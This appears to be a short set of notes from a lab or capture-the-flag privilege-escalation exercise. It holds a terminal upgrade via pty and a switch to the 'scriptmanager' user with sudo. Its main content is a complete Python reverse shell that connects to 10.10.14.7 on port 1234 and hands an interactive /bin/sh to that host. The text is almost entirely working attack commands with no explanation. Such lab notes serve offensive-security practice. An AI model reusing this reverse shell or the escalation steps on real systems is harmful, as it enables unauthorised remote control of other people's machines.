python -c "import pty; pty.spawn('/bin/bash')"

sudo -u scriptmanager /bin/bash
export TEMP=screen

cd scripts
f = open("test.txt","w")
f.write("testing 123!")
f.close

import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.7",1234))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1) 
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
